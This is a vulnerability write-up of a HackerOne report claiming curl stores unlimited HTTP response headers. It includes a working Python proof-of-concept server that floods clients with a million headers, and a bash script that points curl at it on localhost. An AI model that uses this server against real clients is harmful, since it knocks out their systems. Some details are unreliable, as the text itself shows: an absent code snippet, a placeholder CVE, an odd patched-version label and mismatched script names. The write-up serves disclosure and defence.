# Denial of Service in curl via Unrestricted HTTP Header Storage

## Metadata
- **Source:** HackerOne
- **Report:** 2552192 | https://hackerone.com/reports/2552192
- **Submitted:** 2024-06-14
- **Reporter:** stux3net08
- **Program:** curl
- **Bounty:** Not specified in writeup
- **Severity:** high
- **Vuln:** Denial of Service (DoS), Memory Exhaustion, Resource Exhaustion, Improper Input Validation
- **CVEs:** None
- **Category:** memory-binary

## Summary
curl failed to enforce limits on the number or size of HTTP headers accepted in responses, allowing a malicious server to send unlimited headers and exhaust the client's heap memory. An attacker could stream an endless series of headers to force curl into an out-of-memory condition, causing application crashes and denial of service.

## Attack scenario
1. Attacker sets up a malicious HTTP server under their control
2. Attacker crafts HTTP response with 1,000,000+ headers (e.g., X-Excessive-Header-N with 1KB values each)
3. Victim uses curl to request a resource from the attacker's server
4. curl receives response and begins parsing headers without size/count validation
5. Each header is stored in memory without limit checks, consuming gigabytes of RAM
6. System runs out of memory, curl crashes, and application becomes unavailable (DoS)

## Root cause
curl's transfer.c library lacked enforcement of limits on header count and cumulative header size during HTTP response parsing. Headers were unconditionally stored in memory without validation against maximum thresholds, allowing unbounded memory allocation.

## Attacker mindset
Target automated systems, monitoring bots, or CI/CD pipelines using curl to fetch resources from untrusted sources. Craft responses with massive header payloads to trigger out-of-memory conditions, disrupting service availability without requiring code execution or authentication.

## Defensive takeaways
- Implement hard limits on maximum header count per HTTP response (e.g., 100-1000 headers)
- Enforce cumulative header size limits (e.g., 8-16 MB total)
- Add per-header size limits to prevent individual giant headers
- Use libcurl API options to configure header restrictions at application level
- Monitor curl/libcurl memory consumption for anomalies
- Validate and sanitize HTTP responses from untrusted sources
- Deploy network-level filtering to detect abnormal header patterns
- Regularly update curl to patched versions (8.7.1-5 or later)

## Variant hunting
HTTP/2 CONTINUATION frame floods (similar attack vector on H2)
Trailer headers exhaustion in chunked transfer encoding
Cookie jar unlimited growth via Set-Cookie headers
Large header value attacks (fewer headers, each gigabytes in size)
Similar issues in other HTTP clients: wget, httpie, Python requests/urllib3
WebSocket upgrade header exhaustion
Custom protocol handlers (LDAP, SMTP, IMAP) with unbounded metadata fields

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1499 - Service Exhaustion Denial of Service
- T1559 - Inter-Process Communication
- T1571 - Non-Standard Port

## Notes
Affects curl versions up to 8.7.1 (patched in 8.7.1-5). The vulnerability is protocol-agnostic to HTTP but manifests at transport layer. Particularly dangerous for automated systems (bots, CI/CD, scheduled jobs) that cannot manually intervene. Python PoC uses SimpleHTTPRequestHandler to stream excessive headers. Real-world impact amplified in containerized environments with memory limits. Related to CVE-2024-XXXXX class vulnerabilities affecting multiple HTTP parsers.

## Full report
<details><summary>Expand</summary>

## Summary:
Curl's unrestricted header storage lets malicious servers overwhelm memory, leading to out of Memory ( DOS) . When curl retrieves an HTTP response, it stores the incoming headers so that they can be accessed later via the libcurl headers API. However, curl did not have a limit on how many or large headers it would accept in response, allowing a malicious server to stream an endless series of headers and eventually cause curl to run out of heap memory. 

** Tested Versions ** 
```
unfixed in curl 8.7.1 (x86_64-pc-linux-gnu) libcurl/8.7.1 OpenSSL/3.2.2 zlib/1.3.1 brotli/1.1.0 zstd/1.5.5 libidn2/2.3.7 libpsl/0.21.2 libssh2/1.11.0 nghttp2/1.61.0 librtmp/2.3 OpenLDAP/2.5.13

Release-Date: 2024-03-27, security patched: 8.7.1-5
Protocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns ldap ldaps mqtt pop3 pop3s rtmp rtsp scp sftp smb smbs smtp smtps telnet tftp

Features: alt-svc AsynchDNS brotli GSS-API HSTS HTTP2 HTTPS-proxy IDN IPv6 Kerberos Largefile libz NTLM PSL SPNEGO SSL threadsafe TLS-SRP UnixSockets zstd
```

**Vulnerability insight**

From the breakdown of the below , we can see that the vulnerability is found where cURL cannot limit the number of headers to be stored.
Headers are fundamental in HTTP communication, providing metadata and instructions for how requests and responses should be handled (such as Host, Set-Cookie, Content-Type, Content-Length, etc.). Typically, headers are stored directly in memory so that they can be accessed by applications via the libcurl headers API.If cURL does not enforce limits on the number or size of headers, it can lead to memory exhaustion and potential application crashes, causing a denial of service (DoS) attack.
Now consider this vulnerable code snippet of transfer.c file of cURL's core library. This file handles data transfers, managing the process of sending requests and receiving responses over various protocols (like HTTP, FTP, etc.).
 

## Steps To Reproduce:
1.  This  is a Python script which creates a simple HTTP server that serves as an exploit server , It is designed to simulate a vulnerability where an excessive number of HTTP headers are sent in the response, potentially causing memory exhaustion on the client side.
```
import http.server
import socketserver

class ExploitHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def send_headers(self):
        for i in range(1000000):  # Large number to exhaust heap memory
            self.send_header(f'X-Excessive-Header-{i}', 'A' * 1000)
        self.end_headers()

    def do_GET(self):
        self.send_response(200)
        self.send_headers()
        self.wfile.write(b'Exploit server response')

def run(server_class=http.server.HTTPServer, handler_class=ExploitHTTPRequestHandler, port=8080):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f'Starting exploit server on port {port}')
    httpd.serve_forever()

if __name__ == '__main__':
    run()
```

2 . Next, we create a bash file called  curl_memory.sh. Copy the bash script into the bash file , Below is the bash script. This will be used to run the exploit_server.py file and curl command . 
```
#!/bin/bash
# Function to clean up background processes
cleanup() {
    kill $EXPLOIT_SERVER_PID
    exit
}
# Trap the exit signal to ensure cleanup
trap cleanup EXIT
# Start the exploit server in the background
python3 exploit_server.py &
EXPLOIT_SERVER_PID=$!
# Allow the server to start
sleep 2
# Run curl and capture its PID
curl http://localhost:8080 &
CURL_PID=$!
# Allow some time for curl to start
sleep 1
# Check if the curl process is running and monitor its memory usage
if ps -p $CURL_PID > /dev/null; then
    echo "Monitoring curl (PID: $CURL_PID) memory usage..."
    while ps -p $CURL_PID > /dev/null; do
        ps -o pid,rss,vsize,comm -p $CURL_PID
        sleep 1
    done
else
    echo "Curl process not found"
fi
# Wait for the curl process to complete
wait $CURL_PID
# Cleanup
kill $EXPLOIT_SERVER_PID  
```
3. To check the memory while running the script, open another terminal and run.
```
htop
```
Once that is done, we run these commands:
```
chmod +x monitor_curl_memory
./curl_memory

```

```
dmesg | grep -i "out of memory"

```

**Mitigation** 

1. Enforce Header Limits: Set restrictions on header size and number using curl options.

2. Review Application Code: Check your code for proper handling of HTTP response headers to prevent memory issues.

3. Network Filtering: Employ firewalls or WAFs to detect and block malicious traffic exploiting this vulnerability.

4. Monitor Memory Usage: Regularly monitor memory usage and set up alerts for abnormal consumption.


## Supporting Material/References:

https://learn.microsoft.com/en-us/answers/questions/1409035/curl-7-69-(-8-4-0-heap-buffer-overflow-and-curl-7
https://hackerone.com/reports/2072338

## Impact

DOS/overloading of user's system through malicious HTTP server interaction with curl's header parsing.

</details>

---
*Analysed by Claude on 2026-05-24*
